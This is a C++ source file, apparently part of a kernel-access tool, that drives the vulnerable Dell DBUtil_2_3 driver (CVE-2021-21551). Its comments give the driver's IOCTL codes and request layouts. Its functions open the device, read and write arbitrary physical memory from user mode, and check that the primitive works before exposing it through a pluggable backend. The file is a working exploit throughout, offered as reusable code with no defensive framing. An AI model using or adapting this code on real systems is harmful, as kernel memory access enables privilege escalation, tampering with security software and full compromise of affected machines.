#include "r0.hpp"
#include <windows.h>
#include <cstring>
#include <vector>

namespace r0 {

// DBUtil_2_3 (Dell BIOS flash utility driver, CVE-2021-21551).
//
// The IOCTL codes and request layouts below were read out of the shipped
// driver image, not guessed. From the driver's IRP dispatch:
//
//   0x9B0C1F44  read physical memory
//        request  { u64 header; u64 physaddr; u8 payload[]; }
//        length   0x10 + payload_size
//        the driver maps the physical range with MmMapIoSpace and copies it
//        back into the caller's buffer at +0x10.
//
//   0x9B0C1EC8  write physical memory
//        request  { u64 header; u64 base; u32 offset; u32 pad; u8 payload[]; }
//        length   0x18 + payload_size
//        the target address is base + offset (offset is 32-bit).
//
// The other IOCTLs the driver exposes are port I/O (0x9B0C1EC0/1EC4/1F80..)
// and query handlers - none of them are needed here.

namespace {

constexpr DWORD kRead  = 0x9B0C1F44;
constexpr DWORD kWrite = 0x9B0C1EC8;

constexpr size_t kReadHeader  = 0x10;   // header + physaddr
constexpr size_t kWriteHeader = 0x18;   // header + base + offset + pad

HANDLE g_dev = INVALID_HANDLE_VALUE;

bool open_dev() {
    g_dev = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                        OPEN_EXISTING, 0, nullptr);
    return g_dev != INVALID_HANDLE_VALUE;
}

void close_dev() {
    if (g_dev != INVALID_HANDLE_VALUE) { CloseHandle(g_dev); g_dev = INVALID_HANDLE_VALUE; }
}

bool do_read(uint64_t pa, void* out, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;

    std::vector<uint8_t> buf(kReadHeader + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);

    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kRead, buf.data(), (DWORD)buf.size(),
                         buf.data(), (DWORD)buf.size(), &got, nullptr))
        return false;
    if (got < kReadHeader + len) return false;

    memcpy(out, buf.data() + kReadHeader, len);
    return true;
}

bool do_write(uint64_t pa, const void* in, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;

    std::vector<uint8_t> buf(kWriteHeader + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);          // base
    const uint32_t off = 0;
    memcpy(buf.data() + 0x10, &off, 4);         // offset
    memcpy(buf.data() + kWriteHeader, in, len); // payload

    DWORD got = 0;
    return DeviceIoControl(g_dev, kWrite, buf.data(), (DWORD)buf.size(),
                            buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
}

// Global backend pointer – initialised once by init().
// NOTE: starts as nullptr on purpose. If it pointed at the backend table
// from the start, init() would short-circuit on the `if (g_be)` check and
// never open the device, reporting success with no driver present.
Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev, do_read, do_write};
const Backend* g_be = nullptr;

} // anonymous namespace

bool init() {
    // Probe: open the device and read the same physical page twice. Both
    // reads must succeed and agree, otherwise the backend is not usable.
    if (g_be) return true;
    if (!open_dev()) return false;

    uint8_t p1[8]{}, p2[8]{};
    if (!do_read(0, p1, sizeof(p1)) || !do_read(0, p2, sizeof(p2))) {
        close_dev();
        return false;
    }
    if (memcmp(p1, p2, sizeof(p1)) != 0) {
        close_dev();
        return false;
    }

    g_be = &g_be_local;
    return true;
}

void shutdown() {
    if (g_be) { g_be->close(); g_be = nullptr; }
}

bool alive() { return g_be != nullptr; }

void set_backend(const Backend* be) { g_be = be; }

bool pread(uint64_t pa, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->read(pa, buf, len);
}

bool pwrite(uint64_t pa, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->write(pa, buf, len);
}

} // namespace r0